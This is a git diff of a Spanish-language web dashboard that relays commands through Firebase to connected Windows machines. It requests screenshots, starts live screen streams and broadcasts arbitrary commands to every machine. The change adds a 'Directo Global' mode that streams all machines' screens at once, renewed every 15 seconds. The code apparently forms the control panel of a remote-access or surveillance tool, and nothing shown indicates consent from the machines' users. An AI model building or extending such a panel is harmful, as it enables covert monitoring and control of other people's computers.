@@ -1,6 +1,5 @@
 <!doctype html>
 <html lang="es">
-
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
@@ -11,7 +10,6 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
   <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-
   <style>
     body {
       font-family: 'Inter', sans-serif;
@@ -82,7 +80,6 @@
 </head>
 
 <body class="h-screen flex overflow-hidden">
-
   <!-- SIDEBAR -->
   <aside class="w-64 bg-slate-900 border-r border-slate-800 flex flex-col z-20 hidden md:flex">
     <div class="p-6 flex items-center gap-3">
@@ -134,9 +131,17 @@
 
       <!-- VISTA: DASHBOARD (GRID) -->
       <div id="view-dashboard" class="absolute inset-0 overflow-y-auto p-6 transition-transform duration-300">
-        <div class="flex justify-between items-center mb-6">
+        <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
           <h2 class="text-2xl font-semibold text-white">Dispositivos Conectados</h2>
-          <div class="text-sm text-slate-400">Total: <span id="machine-count" class="text-cyan-400 font-bold">0</span>
+          
+          <div class="flex items-center gap-4">
+            <!-- Botón de Directo Global -->
+            <button id="btn-global-live" onclick="toggleGlobalLiveMode()"
+              class="px-4 py-2 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 transition-all flex items-center gap-2 border border-slate-700 text-sm font-medium">
+              <i class="fa-solid fa-video"></i> Directo Global
+            </button>
+            <div class="text-sm text-slate-400 bg-slate-800 px-3 py-2 rounded-lg border border-slate-700">Total: <span id="machine-count" class="text-cyan-400 font-bold">0</span>
+            </div>
           </div>
         </div>
 
@@ -148,8 +153,8 @@
 
       <!-- VISTA: DETALLE (LIVE MONITOR) -->
       <div id="view-detail"
-        class="absolute inset-0 bg-slate-950 flex flex-col translate-x-full transition-transform duration-300 z-30">
-
+        class="absolute inset-0 bg-slate-950 flex flex-col translate-x-full transition-transform duration-300 z-30 hidden">
+        
         <!-- Toolbar Superior -->
         <div class="h-16 bg-slate-900 border-b border-slate-800 flex items-center justify-between px-6 shadow-sm z-10">
           <div class="flex items-center gap-4">
@@ -191,7 +196,6 @@
 
         <!-- Área Principal Dividida -->
         <div class="flex-1 flex overflow-hidden">
-
           <!-- Izquierda: Monitor / Screenshot -->
           <div class="flex-1 bg-black relative flex items-center justify-center overflow-hidden p-4">
             <div id="live-badge" class="absolute top-6 left-6 z-20 hidden">
@@ -210,9 +214,6 @@
               <p class="text-sm mt-2">Pulsa "Ver en Directo" o captura una imagen.</p>
             </div>
           </div>
-
-
-
         </div>
       </div>
 
@@ -237,8 +238,8 @@
         <div class="w-2 h-2 rounded-full bg-slate-600 status-dot"></div>
       </div>
 
-      <div class="h-24 bg-black rounded-lg border border-slate-700 overflow-hidden relative preview-container">
-        <img class="w-full h-full object-cover opacity-50 group-hover:opacity-80 transition-opacity preview-img" src=""
+      <div class="h-28 bg-black rounded-lg border border-slate-700 overflow-hidden relative preview-container">
+        <img class="w-full h-full object-cover opacity-60 group-hover:opacity-100 transition-opacity preview-img" src=""
           style="display:none;">
         <div class="absolute inset-0 flex items-center justify-center text-slate-600 no-preview-icon">
           <i class="fa-regular fa-image text-2xl"></i>
@@ -275,6 +276,10 @@
     let isLive = false;
     let currentCWD = "C:\\";
     let timeOffset = 0;
+    
+    // Estado Live Global
+    let globalLiveInterval = null;
+    let isGlobalLive = false;
 
     // Elementos DOM
     const gridEl = document.getElementById('machines-grid');
@@ -314,6 +319,7 @@
         timeOffset = 0; // Fallback a 0
       }
     }
+    
     function getAdjustedTime() { return Math.floor(Date.now() / 1000) + timeOffset; }
 
     // --- Firebase Listeners ---
@@ -384,7 +390,7 @@
       const cwdEncoded = machines[name]?.info?.cwd;
       currentCWD = cwdEncoded ? safeB64(cwdEncoded) : "C:\\";
 
-      // Stop anterior live mode
+      // Stop anterior live mode individual
       stopLiveMode();
 
       // Update image immediately if exists
@@ -395,7 +401,6 @@
         detailImage.style.display = 'none';
         detailPlaceholder.style.display = 'block';
       }
-
 
     };
 
@@ -437,7 +442,7 @@
       detailPlaceholder.style.display = 'none';
     }
 
-    // --- Live Mode Logic ---
+    // --- Live Mode Individual Logic ---
     window.toggleLiveMode = function () {
       if (isLive) {
         stopLiveMode();
@@ -451,6 +456,7 @@
       isLive = true;
       btnLiveToggle.innerHTML = '<span class="live-indicator"></span> Detener Directo';
       btnLiveToggle.classList.add('border-red-500/50', 'text-red-400', 'bg-red-900/10');
+      btnLiveToggle.classList.remove('bg-slate-800', 'text-slate-300');
       liveBadge.classList.remove('hidden');
 
       // Enviar comando inicial
@@ -467,23 +473,76 @@
       isLive = false;
       btnLiveToggle.innerHTML = '<i class="fa-solid fa-video"></i> Ver en Directo';
       btnLiveToggle.classList.remove('border-red-500/50', 'text-red-400', 'bg-red-900/10');
+      btnLiveToggle.classList.add('bg-slate-800', 'text-slate-300');
       liveBadge.classList.add('hidden');
       if (liveModeInterval) clearInterval(liveModeInterval);
       liveModeInterval = null;
     }
 
     async function sendLiveCommand() {
-      console.log("Iniciando modo LiveStream...", "info");
-      await sendFirebaseCommand(selectedMachine, "/livestream", currentCWD, false); // No borrar inmediatamente para que el script lo lea
+      console.log("Iniciando modo LiveStream Individual...", "info");
+      await sendFirebaseCommand(selectedMachine, "/livestream", currentCWD, false); // No borrar inmediatamente
     }
 
+    // --- Live Mode GLOBAL Logic ---
+    window.toggleGlobalLiveMode = function () {
+      if (isGlobalLive) {
+        stopGlobalLiveMode();
+      } else {
+        startGlobalLiveMode();
+      }
+    }
+
+    function startGlobalLiveMode() {
+      isGlobalLive = true;
+      const btnGlobalLive = document.getElementById('btn-global-live');
+      
+      if (btnGlobalLive) {
+        btnGlobalLive.innerHTML = '<span class="live-indicator"></span> Detener Global';
+        btnGlobalLive.classList.add('border-red-500/50', 'text-red-400', 'bg-red-900/10');
+        btnGlobalLive.classList.remove('bg-slate-800', 'text-slate-300');
+      }
+
+      sendGlobalLiveCommand();
+
+      // Loop de renovación a TODOS (cada 15s)
+      globalLiveInterval = setInterval(() => {
+        if (!isGlobalLive) return;
+        sendGlobalLiveCommand();
+      }, 15000);
+    }
+
+    function stopGlobalLiveMode() {
+      isGlobalLive = false;
+      const btnGlobalLive = document.getElementById('btn-global-live');
+      
+      if (btnGlobalLive) {
+        btnGlobalLive.innerHTML = '<i class="fa-solid fa-video"></i> Directo Global';
+        btnGlobalLive.classList.remove('border-red-500/50', 'text-red-400', 'bg-red-900/10');
+        btnGlobalLive.classList.add('bg-slate-800', 'text-slate-300');
+      }
+
+      if (globalLiveInterval) clearInterval(globalLiveInterval);
+      globalLiveInterval = null;
+    }
+
+    async function sendGlobalLiveCommand() {
+      const names = Object.keys(machines);
+      if(names.length === 0) return;
+      
+      console.log(`Enviando LiveStream a ${names.length} dispositivos...`);
+      names.forEach(name => {
+        sendFirebaseCommand(name, "/livestream", "C:\\", false);
+      });
+    }
+
+    // --- Utilities ---
     window.captureScreenshot = async function () {
       if (!selectedMachine) return;
       console.log("Solicitando captura...", "info");
       await sendFirebaseCommand(selectedMachine, "/screenshot", currentCWD);
     }
 
-    // --- Helpers ---
     async function sendFirebaseCommand(name, cmd, cwd, autoRemove = true) {
       const id = "cmd-" + Date.now();
       const payload = { id, cmd, cwd };
@@ -498,7 +557,6 @@
     window.broadcastCommand = function (cmd) {
       if (!confirm("¿Enviar '" + cmd + "' a TODAS las máquinas?")) return;
       Object.keys(machines).forEach(name => {
-        // Enviar a cada una con pequeño delay para no saturar si son muchas
         sendFirebaseCommand(name, cmd, "C:\\", true);
       });
     }
@@ -513,9 +571,9 @@
       if (!str) return "";
       try { return decodeURIComponent(escape(window.atob(str))); } catch (e) { return str; }
     }
+    
     function encodeKey(s) { return s.replace(/[.\$\[\]#\/ ]/g, "_"); }
 
   </script>
 </body>
-
 </html>
